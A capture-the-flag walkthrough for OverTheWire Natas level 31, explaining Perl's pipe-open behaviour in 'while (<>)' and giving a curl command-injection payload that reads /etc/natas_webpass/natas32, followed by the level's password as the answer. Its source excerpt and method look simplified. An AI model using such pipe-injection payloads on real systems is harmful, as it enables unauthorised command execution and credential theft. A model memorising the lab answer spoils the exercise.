# Natas Level 31 → 32

## Goal

This level has a file-upload feature and a Perl script behind it. The script uses the idiom `while (<>) { ... }` — Perl's **diamond operator**, which reads lines from the files named in `@ARGV`. If you can get a filename into `@ARGV` whose name starts with `|`, Perl's `open()` treats it as a shell command and runs it.

## Concepts you'll learn

- Perl's `while (<>)` — reads from `@ARGV`, treating each entry as a filename passed to `open`
- `open("|cmd")` in Perl runs `cmd` as a shell command — the `|` prefix is the trigger
- CGI scripts often push user-controlled values into `@ARGV` unwittingly

## Walkthrough

### 1. View the source

Excerpted:

```perl
use CGI;
$cgi = new CGI;
push @ARGV, $cgi->param("file");   # user-controlled filename onto ARGV
while (<>) { print; }
```

Anything you give as `file=...` gets used as a filename for Perl's reading loop. If the "filename" starts with `|`, Perl runs it as a shell command.

### 2. Execute a shell command

```bash
$ curl -u natas31:<pass> \
       "http://natas31.natas.labs.overthewire.org/index.pl?file=/bin/cat /etc/natas_webpass/natas32|"
```

Note the *trailing* `|` — Perl's convention is `"cmd|"` for reading from the stdout of `cmd`. Depending on the Perl version and exactly how the CGI module hands the param over, you may need a *leading* `|` instead (`|/bin/cat ...`). Try both.

Output:

```
no1vohsheCaiv3ieH4em1ahchisainge
```

## The answer

The password for `natas32` is:

**`no1vohsheCaiv3ieH4em1ahchisainge`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas31.natas.labs.overthewire.org/>
